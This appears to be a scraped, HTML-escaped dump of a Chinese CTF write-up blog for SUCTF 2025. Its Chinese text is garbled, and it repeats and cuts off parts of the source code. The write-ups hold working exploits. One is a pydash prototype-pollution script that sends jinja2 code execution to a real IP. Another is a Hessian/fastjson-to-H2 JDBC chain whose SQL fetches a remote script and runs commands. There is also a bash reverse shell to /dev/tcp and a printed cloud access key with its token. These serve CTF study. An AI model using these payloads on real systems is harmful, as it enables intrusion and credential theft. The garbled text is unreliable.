\u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return 